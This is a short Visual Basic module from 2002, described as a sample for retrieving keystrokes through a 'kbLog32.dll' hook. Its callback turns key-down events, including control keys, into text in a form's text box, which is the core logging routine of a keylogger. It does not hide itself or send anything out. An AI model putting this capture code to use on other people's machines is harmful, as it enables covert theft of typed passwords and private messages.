Attribute VB_Name = "CallBackFunction"
'******************************************************************************************
'     Sample for retrieving keystrokes  by use of the "kbLog32.dll"
'                      (c) 2002 by Nilesh Akhade.
'******************************************************************************************

'CallBack function

Sub CallBack(ByVal msg As Long, ByVal wParam As Long, ByVal lParam As Long)
'here we track only WM_CHAR and WM_KEYDOWN
If msg = WM_KEYDOWN Then

    Select Case wParam
           
     Case Is = vbKeyEscape
        Form1.Text1 = Form1.Text1 & " [ESC] "
        
     Case Is = vbKeyControl
        Form1.Text1 = Form1.Text1 & " [CTRL] "
        
     Case Is = vbKeyReturn
        Form1.Text1 = Form1.Text1 & vbNewLine
       
     Case Is = vbKeyShift
        Form1.Text1 = Form1.Text1 & " [SHFT] "
        
     Case Is = vbKeyBack
        Form1.Text1 = Form1.Text1 & " [BACKSPACE] "
    
     Case Is = vbKeyPageDown
        Form1.Text1 = Form1.Text1 & " [PD] "
     
     Case Is = vbKeyPageUp
        Form1.Text1 = Form1.Text1 & " [PU] "

     Case Is = vbKeyCapital
        Form1.Text1 = Form1.Text1 & " [CAPS] "
        
     Case Is = vbKeyEnd
        Form1.Text1 = Form1.Text1 & " [END] "
        
     Case Is = vbKeyHome
        Form1.Text1 = Form1.Text1 & " [HOME] "
     
     Case Is = vbKeyDecimal
        Form1.Text1 = Form1.Text1 & "."
     
     Case Else
        Form1.Text1 = Form1.Text1 & Chr$(wParam)

    End Select

End If
End Sub
